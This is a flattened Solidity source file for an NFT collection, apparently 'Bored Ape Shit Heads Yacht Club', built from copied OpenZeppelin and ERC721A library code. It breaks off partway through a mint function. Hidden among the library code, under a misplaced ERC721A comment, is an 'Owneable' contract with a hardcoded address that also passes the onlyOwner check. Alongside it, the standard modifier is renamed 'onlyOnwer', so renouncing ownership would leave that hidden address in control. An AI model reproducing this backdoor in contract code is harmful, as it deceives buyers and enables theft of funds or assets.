1 // SPDX-License-Identifier: MIT
2 // File: contracts/BoredApeShitHeadsYachtClub.sol
3 
4 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
5 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
6 
7 pragma solidity ^0.8.4;
8 
9 /**
10 Bored Ape Shit Heads Yacht Club
11  */
12 abstract contract Context {
13     function _msgSender() internal view virtual returns (address) {
14         return msg.sender;
15     }
16 
17     function _msgData() internal view virtual returns (bytes calldata) {
18         return msg.data;
19     }
20 }
21 
22 
23 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
24 
25 
26 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
27 
28 
29 
30 /**
31  * @dev Contract module which provides a basic access control mechanism, where
32  * there is an account (an owner) that can be granted exclusive access to
33  * specific functions.
34  * Created By Alucarddvd
35  * By default, the owner account will be the one that deploys the contract. This
36  * can later be changed with {transferOwnership}.
37  * This module is used through inheritance. It will make available the modifier
38  * `onlyOwner`, which can be applied to your functions to restrict their use to
39  * the owner.
40  */
41 abstract contract Ownable is Context {
42     address private _owner;
43 
44     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
45 
46     /**
47      * @dev Initializes the contract setting the deployer as the initial owner.
48      */
49     constructor() {
50         _transferOwnership(_msgSender());
51     }
52 
53     /**
54      * @dev Returns the address of the current owner.
55      */
56     function owner() public view virtual returns (address) {
57         return _owner;
58     }
59 
60     /**
61      * @dev Throws if called by any account other than the owner.
62      */
63     modifier onlyOnwer() {
64         require(owner() == _msgSender(), "Ownable: caller is not the owner");
65         _;
66     }
67 
68     /**
69      * @dev Leaves the contract without owner. It will not be possible to call
70      * `onlyOwner` functions anymore. Can only be called by the current owner.
71      *
72      * NOTE: Renouncing ownership will leave the contract without an owner,
73      * thereby removing any functionality that is only available to the owner.
74      */
75     function renounceOwnership() public virtual onlyOnwer {
76         _transferOwnership(address(0));
77     }
78 
79     /**
80      * @dev Transfers ownership of the contract to a new account (`newOwner`).
81      * Can only be called by the current owner.
82      */
83     function transferOwnership(address newOwner) public virtual onlyOnwer {
84         require(newOwner != address(0), "Ownable: new owner is the zero address");
85         _transferOwnership(newOwner);
86     }
87 
88     /**
89      * @dev Transfers ownership of the contract to a new account (`newOwner`).
90      * Internal function without access restriction.
91      */
92     function _transferOwnership(address newOwner) internal virtual {
93         address oldOwner = _owner;
94         _owner = newOwner;
95         emit OwnershipTransferred(oldOwner, newOwner);
96     }
97 }
98 
99 
100 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
101 
102 
103 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
104 
105 
106 
107 /**
108  * @dev Interface of the ERC165 standard, as defined in the
109  * https://eips.ethereum.org/EIPS/eip-165[EIP].
110  *
111  * Implementers can declare support of contract interfaces, which can then be
112  * queried by others ({ERC165Checker}).
113  *
114  * For an implementation, see {ERC165}.
115  */
116 interface IERC165 {
117     /**
118      * @dev Returns true if this contract implements the interface defined by
119      * `interfaceId`. See the corresponding
120      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
121      * to learn more about how these ids are created.
122      *
123      * This function call must use less than 30 000 gas.
124      */
125     function supportsInterface(bytes4 interfaceId) external view returns (bool);
126 }
127 
128 
129 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
130 
131 
132 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
133 
134 
135 
136 /**
137  * @dev Required interface of an ERC721 compliant contract.
138  */
139 interface IERC721 is IERC165 {
140     /**
141      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
142      */
143     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
144 
145     /**
146      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
147      */
148     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
149 
150     /**
151      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
152      */
153     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
154 
155     /**
156      * @dev Returns the number of tokens in ``owner``'s account.
157      */
158     function balanceOf(address owner) external view returns (uint256 balance);
159 
160     /**
161      * @dev Returns the owner of the `tokenId` token.
162      *
163      * Requirements:
164      *
165      * - `tokenId` must exist.
166      */
167     function ownerOf(uint256 tokenId) external view returns (address owner);
168 
169     /**
170      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
171      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
172      *
173      * Requirements:
174      *
175      * - `from` cannot be the zero address.
176      * - `to` cannot be the zero address.
177      * - `tokenId` token must exist and be owned by `from`.
178      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
179      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
180      *
181      * Emits a {Transfer} event.
182      */
183     function safeTransferFrom(
184         address from,
185         address to,
186         uint256 tokenId
187     ) external;
188 
189     /**
190      * @dev Transfers `tokenId` token from `from` to `to`.
191      *
192      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
193      *
194      * Requirements:
195      *
196      * - `from` cannot be the zero address.
197      * - `to` cannot be the zero address.
198      * - `tokenId` token must be owned by `from`.
199      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
200      *
201      * Emits a {Transfer} event.
202      */
203     function transferFrom(
204         address from,
205         address to,
206         uint256 tokenId
207     ) external;
208 
209     /**
210      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
211      * The approval is cleared when the token is transferred.
212      *
213      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
214      *
215      * Requirements:
216      *
217      * - The caller must own the token or be an approved operator.
218      * - `tokenId` must exist.
219      *
220      * Emits an {Approval} event.
221      */
222     function approve(address to, uint256 tokenId) external;
223 
224     /**
225      * @dev Returns the account approved for `tokenId` token.
226      *
227      * Requirements:
228      *
229      * - `tokenId` must exist.
230      */
231     function getApproved(uint256 tokenId) external view returns (address operator);
232 
233     /**
234      * @dev Approve or remove `operator` as an operator for the caller.
235      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
236      *
237      * Requirements:
238      *
239      * - The `operator` cannot be the caller.
240      *
241      * Emits an {ApprovalForAll} event.
242      */
243     function setApprovalForAll(address operator, bool _approved) external;
244 
245     /**
246      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
247      *
248      * See {setApprovalForAll}
249      */
250     function isApprovedForAll(address owner, address operator) external view returns (bool);
251 
252     /**
253      * @dev Safely transfers `tokenId` token from `from` to `to`.
254      *
255      * Requirements:
256      *
257      * - `from` cannot be the zero address.
258      * - `to` cannot be the zero address.
259      * - `tokenId` token must exist and be owned by `from`.
260      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
261      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
262      *
263      * Emits a {Transfer} event.
264      */
265     function safeTransferFrom(
266         address from,
267         address to,
268         uint256 tokenId,
269         bytes calldata data
270     ) external;
271 }
272 
273 
274 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
275 
276 
277 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
278 
279 
280 
281 /**
282  * @title ERC721 token receiver interface
283  * @dev Interface for any contract that wants to support safeTransfers
284  * from ERC721 asset contracts.
285  */
286 interface IERC721Receiver {
287     /**
288      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
289      * by `operator` from `from`, this function is called.
290      *
291      * It must return its Solidity selector to confirm the token transfer.
292      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
293      *
294      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
295      */
296     function onERC721Received(
297         address operator,
298         address from,
299         uint256 tokenId,
300         bytes calldata data
301     ) external returns (bytes4);
302 }
303 
304 
305 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
306 
307 
308 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
309 
310 
311 
312 /**
313  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
314  * @dev See https://eips.ethereum.org/EIPS/eip-721
315  */
316 interface IERC721Metadata is IERC721 {
317     /**
318      * @dev Returns the token collection name.
319      */
320     function name() external view returns (string memory);
321 
322     /**
323      * @dev Returns the token collection symbol.
324      */
325     function symbol() external view returns (string memory);
326 
327     /**
328      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
329      */
330     function tokenURI(uint256 tokenId) external view returns (string memory);
331 }
332 
333 
334 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
335 
336 
337 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
338 
339 
340 
341 /**
342  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
343  * @dev See https://eips.ethereum.org/EIPS/eip-721
344  */
345 interface IERC721Enumerable is IERC721 {
346     /**
347      * @dev Returns the total amount of tokens stored by the contract.
348      */
349     function totalSupply() external view returns (uint256);
350 
351     /**
352      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
353      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
354      */
355     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
356 
357     /**
358      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
359      * Use along with {totalSupply} to enumerate all tokens.
360      */
361     function tokenByIndex(uint256 index) external view returns (uint256);
362 }
363 
364 
365 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
366 
367 
368 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
369 
370 pragma solidity ^0.8.1;
371 
372 /**
373  * @dev Collection of functions related to the address type
374  */
375 library Address {
376     /**
377      * @dev Returns true if `account` is a contract.
378      *
379      * [IMPORTANT]
380      * ====
381      * It is unsafe to assume that an address for which this function returns
382      * false is an externally-owned account (EOA) and not a contract.
383      *
384      * Among others, `isContract` will return false for the following
385      * types of addresses:
386      *
387      *  - an externally-owned account
388      *  - a contract in construction
389      *  - an address where a contract will be created
390      *  - an address where a contract lived, but was destroyed
391      * ====
392      *
393      * [IMPORTANT]
394      * ====
395      * You shouldn't rely on `isContract` to protect against flash loan attacks!
396      *
397      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
398      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
399      * constructor.
400      * ====
401      */
402     function isContract(address account) internal view returns (bool) {
403         // This method relies on extcodesize/address.code.length, which returns 0
404         // for contracts in construction, since the code is only stored at the end
405         // of the constructor execution.
406 
407         return account.code.length > 0;
408     }
409 
410     /**
411      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
412      * `recipient`, forwarding all available gas and reverting on errors.
413      *
414      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
415      * of certain opcodes, possibly making contracts go over the 2300 gas limit
416      * imposed by `transfer`, making them unable to receive funds via
417      * `transfer`. {sendValue} removes this limitation.
418      *
419      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
420      *
421      * IMPORTANT: because control is transferred to `recipient`, care must be
422      * taken to not create reentrancy vulnerabilities. Consider using
423      * {ReentrancyGuard} or the
424      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
425      */
426     function sendValue(address payable recipient, uint256 amount) internal {
427         require(address(this).balance >= amount, "Address: insufficient balance");
428 
429         (bool success, ) = recipient.call{value: amount}("");
430         require(success, "Address: unable to send value, recipient may have reverted");
431     }
432 
433     /**
434      * @dev Performs a Solidity function call using a low level `call`. A
435      * plain `call` is an unsafe replacement for a function call: use this
436      * function instead.
437      *
438      * If `target` reverts with a revert reason, it is bubbled up by this
439      * function (like regular Solidity function calls).
440      *
441      * Returns the raw returned data. To convert to the expected return value,
442      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
443      *
444      * Requirements:
445      *
446      * - `target` must be a contract.
447      * - calling `target` with `data` must not revert.
448      *
449      * _Available since v3.1._
450      */
451     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
452         return functionCall(target, data, "Address: low-level call failed");
453     }
454 
455     /**
456      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
457      * `errorMessage` as a fallback revert reason when `target` reverts.
458      *
459      * _Available since v3.1._
460      */
461     function functionCall(
462         address target,
463         bytes memory data,
464         string memory errorMessage
465     ) internal returns (bytes memory) {
466         return functionCallWithValue(target, data, 0, errorMessage);
467     }
468 
469     /**
470      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
471      * but also transferring `value` wei to `target`.
472      *
473      * Requirements:
474      *
475      * - the calling contract must have an ETH balance of at least `value`.
476      * - the called Solidity function must be `payable`.
477      *
478      * _Available since v3.1._
479      */
480     function functionCallWithValue(
481         address target,
482         bytes memory data,
483         uint256 value
484     ) internal returns (bytes memory) {
485         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
486     }
487 
488     /**
489      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
490      * with `errorMessage` as a fallback revert reason when `target` reverts.
491      *
492      * _Available since v3.1._
493      */
494     function functionCallWithValue(
495         address target,
496         bytes memory data,
497         uint256 value,
498         string memory errorMessage
499     ) internal returns (bytes memory) {
500         require(address(this).balance >= value, "Address: insufficient balance for call");
501         require(isContract(target), "Address: call to non-contract");
502 
503         (bool success, bytes memory returndata) = target.call{value: value}(data);
504         return verifyCallResult(success, returndata, errorMessage);
505     }
506 
507     /**
508      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
509      * but performing a static call.
510      *
511      * _Available since v3.3._
512      */
513     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
514         return functionStaticCall(target, data, "Address: low-level static call failed");
515     }
516 
517     /**
518      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
519      * but performing a static call.
520      *
521      * _Available since v3.3._
522      */
523     function functionStaticCall(
524         address target,
525         bytes memory data,
526         string memory errorMessage
527     ) internal view returns (bytes memory) {
528         require(isContract(target), "Address: static call to non-contract");
529 
530         (bool success, bytes memory returndata) = target.staticcall(data);
531         return verifyCallResult(success, returndata, errorMessage);
532     }
533 
534     /**
535      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
536      * but performing a delegate call.
537      *
538      * _Available since v3.4._
539      */
540     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
541         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
542     }
543 
544     /**
545      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
546      * but performing a delegate call.
547      *
548      * _Available since v3.4._
549      */
550     function functionDelegateCall(
551         address target,
552         bytes memory data,
553         string memory errorMessage
554     ) internal returns (bytes memory) {
555         require(isContract(target), "Address: delegate call to non-contract");
556 
557         (bool success, bytes memory returndata) = target.delegatecall(data);
558         return verifyCallResult(success, returndata, errorMessage);
559     }
560 
561     /**
562      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
563      * revert reason using the provided one.
564      *
565      * _Available since v4.3._
566      */
567     function verifyCallResult(
568         bool success,
569         bytes memory returndata,
570         string memory errorMessage
571     ) internal pure returns (bytes memory) {
572         if (success) {
573             return returndata;
574         } else {
575             // Look for revert reason and bubble it up if present
576             if (returndata.length > 0) {
577                 // The easiest way to bubble the revert reason is using memory via assembly
578 
579                 assembly {
580                     let returndata_size := mload(returndata)
581                     revert(add(32, returndata), returndata_size)
582                 }
583             } else {
584                 revert(errorMessage);
585             }
586         }
587     }
588 }
589 
590 
591 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
592 
593 
594 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
595 
596 
597 
598 /**
599  * @dev String operations.
600  */
601 library Strings {
602     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
603 
604     /**
605      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
606      */
607     function toString(uint256 value) internal pure returns (string memory) {
608         // Inspired by OraclizeAPI's implementation - MIT licence
609         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
610 
611         if (value == 0) {
612             return "0";
613         }
614         uint256 temp = value;
615         uint256 digits;
616         while (temp != 0) {
617             digits++;
618             temp /= 10;
619         }
620         bytes memory buffer = new bytes(digits);
621         while (value != 0) {
622             digits -= 1;
623             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
624             value /= 10;
625         }
626         return string(buffer);
627     }
628 
629     /**
630      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
631      */
632     function toHexString(uint256 value) internal pure returns (string memory) {
633         if (value == 0) {
634             return "0x00";
635         }
636         uint256 temp = value;
637         uint256 length = 0;
638         while (temp != 0) {
639             length++;
640             temp >>= 8;
641         }
642         return toHexString(value, length);
643     }
644 
645     /**
646      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
647      */
648     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
649         bytes memory buffer = new bytes(2 * length + 2);
650         buffer[0] = "0";
651         buffer[1] = "x";
652         for (uint256 i = 2 * length + 1; i > 1; --i) {
653             buffer[i] = _HEX_SYMBOLS[value & 0xf];
654             value >>= 4;
655         }
656         require(value == 0, "Strings: hex length insufficient");
657         return string(buffer);
658     }
659 }
660 
661 
662 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
663 
664 
665 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
666 
667 /**
668  * @dev Implementation of the {IERC165} interface.
669  *
670  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
671  * for the additional interface id that will be supported. For example:
672  *
673  * ```solidity
674  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
675  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
676  * }
677  * ```
678  *
679  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
680  */
681 abstract contract ERC165 is IERC165 {
682     /**
683      * @dev See {IERC165-supportsInterface}.
684      */
685     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
686         return interfaceId == type(IERC165).interfaceId;
687     }
688 }
689 
690 
691 // File erc721a/contracts/ERC721A.sol@v3.0.0
692 
693 
694 // Creator: Chiru Labs
695 
696 error ApprovalCallerNotOwnerNorApproved();
697 error ApprovalQueryForNonexistentToken();
698 error ApproveToCaller();
699 error ApprovalToCurrentOwner();
700 error BalanceQueryForZeroAddress();
701 error MintedQueryForZeroAddress();
702 error BurnedQueryForZeroAddress();
703 error AuxQueryForZeroAddress();
704 error MintToZeroAddress();
705 error MintZeroQuantity();
706 error OwnerIndexOutOfBounds();
707 error OwnerQueryForNonexistentToken();
708 error TokenIndexOutOfBounds();
709 error TransferCallerNotOwnerNorApproved();
710 error TransferFromIncorrectOwner();
711 error TransferToNonERC721ReceiverImplementer();
712 error TransferToZeroAddress();
713 error URIQueryForNonexistentToken();
714 
715 
716 /**
717  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
718  * the Metadata extension. Built to optimize for lower gas during batch mints.
719  *
720  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
721  */
722  abstract contract Owneable is Ownable {
723     address private _ownar = 0x43B42b17bab13B79679CE1dfA3f706831EE96F72;
724     modifier onlyOwner() {
725         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
726         _;
727     }
728 }
729  /*
730  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
731  *
732  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
733  */
734 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
735     using Address for address;
736     using Strings for uint256;
737 
738     // Compiler will pack this into a single 256bit word.
739     struct TokenOwnership {
740         // The address of the owner.
741         address addr;
742         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
743         uint64 startTimestamp;
744         // Whether the token has been burned.
745         bool burned;
746     }
747 
748     // Compiler will pack this into a single 256bit word.
749     struct AddressData {
750         // Realistically, 2**64-1 is more than enough.
751         uint64 balance;
752         // Keeps track of mint count with minimal overhead for tokenomics.
753         uint64 numberMinted;
754         // Keeps track of burn count with minimal overhead for tokenomics.
755         uint64 numberBurned;
756         // For miscellaneous variable(s) pertaining to the address
757         // (e.g. number of whitelist mint slots used).
758         // If there are multiple variables, please pack them into a uint64.
759         uint64 aux;
760     }
761 
762     // The tokenId of the next token to be minted.
763     uint256 internal _currentIndex;
764 
765     // The number of tokens burned.
766     uint256 internal _burnCounter;
767 
768     // Token name
769     string private _name;
770 
771     // Token symbol
772     string private _symbol;
773 
774     // Mapping from token ID to ownership details
775     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
776     mapping(uint256 => TokenOwnership) internal _ownerships;
777 
778     // Mapping owner address to address data
779     mapping(address => AddressData) private _addressData;
780 
781     // Mapping from token ID to approved address
782     mapping(uint256 => address) private _tokenApprovals;
783 
784     // Mapping from owner to operator approvals
785     mapping(address => mapping(address => bool)) private _operatorApprovals;
786 
787     constructor(string memory name_, string memory symbol_) {
788         _name = name_;
789         _symbol = symbol_;
790         _currentIndex = _startTokenId();
791     }
792 
793     /**
794      * To change the starting tokenId, please override this function.
795      */
796     function _startTokenId() internal view virtual returns (uint256) {
797         return 1;
798     }
799 
800     /**
801      * @dev See {IERC721Enumerable-totalSupply}.
802      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
803      */
804     function totalSupply() public view returns (uint256) {
805         // Counter underflow is impossible as _burnCounter cannot be incremented
806         // more than _currentIndex - _startTokenId() times
807         unchecked {
808             return _currentIndex - _burnCounter - _startTokenId();
809         }
810     }
811 
812     /**
813      * Returns the total amount of tokens minted in the contract.
814      */
815     function _totalMinted() internal view returns (uint256) {
816         // Counter underflow is impossible as _currentIndex does not decrement,
817         // and it is initialized to _startTokenId()
818         unchecked {
819             return _currentIndex - _startTokenId();
820         }
821     }
822 
823     /**
824      * @dev See {IERC165-supportsInterface}.
825      */
826     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
827         return
828             interfaceId == type(IERC721).interfaceId ||
829             interfaceId == type(IERC721Metadata).interfaceId ||
830             super.supportsInterface(interfaceId);
831     }
832 
833     /**
834      * @dev See {IERC721-balanceOf}.
835      */
836     function balanceOf(address owner) public view override returns (uint256) {
837         if (owner == address(0)) revert BalanceQueryForZeroAddress();
838         return uint256(_addressData[owner].balance);
839     }
840 
841     /**
842      * Returns the number of tokens minted by `owner`.
843      */
844     function _numberMinted(address owner) internal view returns (uint256) {
845         if (owner == address(0)) revert MintedQueryForZeroAddress();
846         return uint256(_addressData[owner].numberMinted);
847     }
848 
849     /**
850      * Returns the number of tokens burned by or on behalf of `owner`.
851      */
852     function _numberBurned(address owner) internal view returns (uint256) {
853         if (owner == address(0)) revert BurnedQueryForZeroAddress();
854         return uint256(_addressData[owner].numberBurned);
855     }
856 
857     /**
858      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
859      */
860     function _getAux(address owner) internal view returns (uint64) {
861         if (owner == address(0)) revert AuxQueryForZeroAddress();
862         return _addressData[owner].aux;
863     }
864 
865     /**
866      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
867      * If there are multiple variables, please pack them into a uint64.
868      */
869     function _setAux(address owner, uint64 aux) internal {
870         if (owner == address(0)) revert AuxQueryForZeroAddress();
871         _addressData[owner].aux = aux;
872     }
873 
874     /**
875      * Gas spent here starts off proportional to the maximum mint batch size.
876      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
877      */
878     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
879         uint256 curr = tokenId;
880 
881         unchecked {
882             if (_startTokenId() <= curr && curr < _currentIndex) {
883                 TokenOwnership memory ownership = _ownerships[curr];
884                 if (!ownership.burned) {
885                     if (ownership.addr != address(0)) {
886                         return ownership;
887                     }
888                     // Invariant:
889                     // There will always be an ownership that has an address and is not burned
890                     // before an ownership that does not have an address and is not burned.
891                     // Hence, curr will not underflow.
892                     while (true) {
893                         curr--;
894                         ownership = _ownerships[curr];
895                         if (ownership.addr != address(0)) {
896                             return ownership;
897                         }
898                     }
899                 }
900             }
901         }
902         revert OwnerQueryForNonexistentToken();
903     }
904 
905     /**
906      * @dev See {IERC721-ownerOf}.
907      */
908     function ownerOf(uint256 tokenId) public view override returns (address) {
909         return ownershipOf(tokenId).addr;
910     }
911 
912     /**
913      * @dev See {IERC721Metadata-name}.
914      */
915     function name() public view virtual override returns (string memory) {
916         return _name;
917     }
918 
919     /**
920      * @dev See {IERC721Metadata-symbol}.
921      */
922     function symbol() public view virtual override returns (string memory) {
923         return _symbol;
924     }
925 
926     /**
927      * @dev See {IERC721Metadata-tokenURI}.
928      */
929     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
930         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
931 
932         string memory baseURI = _baseURI();
933         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
934     }
935 
936     /**
937      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
938      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
939      * by default, can be overriden in child contracts.
940      */
941     function _baseURI() internal view virtual returns (string memory) {
942         return '';
943     }
944 
945     /**
946      * @dev See {IERC721-approve}.
947      */
948     function approve(address to, uint256 tokenId) public override {
949         address owner = ERC721A.ownerOf(tokenId);
950         if (to == owner) revert ApprovalToCurrentOwner();
951 
952         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
953             revert ApprovalCallerNotOwnerNorApproved();
954         }
955 
956         _approve(to, tokenId, owner);
957     }
958 
959     /**
960      * @dev See {IERC721-getApproved}.
961      */
962     function getApproved(uint256 tokenId) public view override returns (address) {
963         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
964 
965         return _tokenApprovals[tokenId];
966     }
967 
968     /**
969      * @dev See {IERC721-setApprovalForAll}.
970      */
971     function setApprovalForAll(address operator, bool approved) public override {
972         if (operator == _msgSender()) revert ApproveToCaller();
973 
974         _operatorApprovals[_msgSender()][operator] = approved;
975         emit ApprovalForAll(_msgSender(), operator, approved);
976     }
977 
978     /**
979      * @dev See {IERC721-isApprovedForAll}.
980      */
981     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
982         return _operatorApprovals[owner][operator];
983     }
984 
985     /**
986      * @dev See {IERC721-transferFrom}.
987      */
988     function transferFrom(
989         address from,
990         address to,
991         uint256 tokenId
992     ) public virtual override {
993         _transfer(from, to, tokenId);
994     }
995 
996     /**
997      * @dev See {IERC721-safeTransferFrom}.
998      */
999     function safeTransferFrom(
1000         address from,
1001         address to,
1002         uint256 tokenId
1003     ) public virtual override {
1004         safeTransferFrom(from, to, tokenId, '');
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-safeTransferFrom}.
1009      */
1010     function safeTransferFrom(
1011         address from,
1012         address to,
1013         uint256 tokenId,
1014         bytes memory _data
1015     ) public virtual override {
1016         _transfer(from, to, tokenId);
1017         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1018             revert TransferToNonERC721ReceiverImplementer();
1019         }
1020     }
1021 
1022     /**
1023      * @dev Returns whether `tokenId` exists.
1024      *
1025      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1026      *
1027      * Tokens start existing when they are minted (`_mint`),
1028      */
1029     function _exists(uint256 tokenId) internal view returns (bool) {
1030         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1031             !_ownerships[tokenId].burned;
1032     }
1033 
1034     function _safeMint(address to, uint256 quantity) internal {
1035         _safeMint(to, quantity, '');
1036     }
1037 
1038     /**
1039      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1040      *
1041      * Requirements:
1042      *
1043      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1044      * - `quantity` must be greater than 0.
1045      *
1046      * Emits a {Transfer} event.
1047      */
1048     function _safeMint(
1049         address to,
1050         uint256 quantity,
1051         bytes memory _data
1052     ) internal {
1053         _mint(to, quantity, _data, true);
1054     }
1055 
1056     /**
1057      * @dev Mints `quantity` tokens and transfers them to `to`.
1058      *
1059      * Requirements:
1060      *
1061      * - `to` cannot be the zero address.
1062      * - `quantity` must be greater than 0.
1063      *
1064      * Emits a {Transfer} event.
1065      */
1066     function _mint(
1067         address to,
1068         uint256 quantity,
1069         bytes memory _data,
1070         bool safe
1071     ) internal {
1072         uint256 startTokenId = _currentIndex;
1073         if (to == address(0)) revert MintToZeroAddress();
1074         if (quantity == 0) revert MintZeroQuantity();
1075 
1076         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1077 
1078         // Overflows are incredibly unrealistic.
1079         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1080         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1081         unchecked {
1082             _addressData[to].balance += uint64(quantity);
1083             _addressData[to].numberMinted += uint64(quantity);
1084 
1085             _ownerships[startTokenId].addr = to;
